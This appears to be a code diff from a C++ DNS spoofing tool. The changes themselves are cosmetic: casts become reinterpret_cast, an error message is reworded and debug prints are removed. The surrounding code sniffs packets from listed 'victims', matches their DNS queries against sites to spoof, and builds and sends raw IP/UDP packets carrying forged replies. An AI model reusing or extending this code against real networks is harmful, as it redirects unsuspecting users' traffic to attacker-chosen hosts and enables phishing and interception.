@@ -65,16 +65,16 @@ std::string DnsSection::to_bytes(){
     return oss.str();
 }
 
-uint32_t bytes_to_int(const char* bytes, ssize_t len){
+uint32_t bytes_to_int(const char* bytes, const ssize_t len){
     switch (len) {
         case 1:
             return (uint8_t) bytes[0];
         case 2:
-            return ntohs(*((uint16_t * ) bytes));
+            return ntohs(*(reinterpret_cast<const uint16_t *>(bytes)));
         case 4:
-            return ntohl(*((uint32_t * ) bytes));
+            return ntohl(*(reinterpret_cast<const uint32_t *>(bytes)));
     }
-    throw std::invalid_argument("not a 1,2 or 4");
+    throw std::invalid_argument("len is not a 1,2 or 4");
 }
 
 
@@ -106,7 +106,7 @@ uint16_t calculate_ipv4_checksum(const iphdr* ip_hdr){
     const char * data= (const char* )ip_hdr;
     uint64_t sum=0;
     for(size_t val_num=0;val_num<sizeof(iphdr)/2; ++val_num){
-        uint16_t val = *((uint16_t *)(data+val_num*2));
+        uint16_t val = *(reinterpret_cast<const uint16_t *>(data+val_num*2));
         sum+=htons(val);
     }
     sum-=htons(ip_hdr->check);
@@ -147,14 +147,14 @@ void send_dns_response(DnsSection dns_section_response, std::string destination_
     udp_hdr.check = 0; // checksum for ipv4 is optional
 
     std::ostringstream oss;
-    oss.write((char *) &ip_hdr,sizeof(iphdr));
-    oss.write((char *) &udp_hdr,sizeof(udphdr));
+    oss.write(reinterpret_cast<char *>(&ip_hdr),sizeof(iphdr));
+    oss.write(reinterpret_cast<char *>(&udp_hdr),sizeof(udphdr));
     oss<<payload;
 
 
     auto data = oss.str();
 
-    if(sendto(fd,data.c_str(),data.size(),0,(struct sockaddr*)&dest,sizeof(dest))==-1)
+    if(sendto(fd,data.c_str(),data.size(),0, reinterpret_cast<sockaddr*>(&dest),sizeof(dest))==-1)
         perror("sendto error\n");
 }
 
@@ -183,17 +183,13 @@ void dns_frame_handler(u_char *arg_array, const struct pcap_pkthdr *h, const u_c
     ssize_t udp_size = sizeof( struct udphdr );
 
 //    const struct ether_header *ethernet = ( struct ether_header* ) bytes;
-    const struct ip *ip_hdr = (struct ip*) ( bytes + ETH_HLEN );
+    const struct ip *ip_hdr = reinterpret_cast<const ip*>( bytes + ETH_HLEN );
     if(ip_hdr->ip_v==4){
-        const struct udphdr *udp = (const struct udphdr*) (bytes + ETH_HLEN + ip_size );
+        const struct udphdr *udp = reinterpret_cast<const udphdr*> (bytes + ETH_HLEN + ip_size );
         const u_char *payload = ( bytes + ETH_HLEN + ip_size + udp_size );
         for(auto victim: *victims)
             if(ip_hdr->ip_src.s_addr == inet_addr(victim.ip.c_str())){
-                auto dns_frame = parse_dns_section((char *)payload, udp->uh_ulen-8);
-//                std::cout<< dns_frame.transaction_ID <<std::endl<<dns_frame.flags<<std::endl<<dns_frame.questions<<std::endl;
-//                for(auto question: dns_frame.queries){
-//                    std::cout<<question.get_name()<< " "<<question.type<< " "<<question.class_<<std::endl<<std::endl;
-//                }
+                auto dns_frame = parse_dns_section(reinterpret_cast<const char *>(payload), udp->uh_ulen-8);
                 for(auto site_to_spoof: victim.sites){
                     for(auto question: dns_frame.queries){
                         if(site_to_spoof.first == question.get_name()){
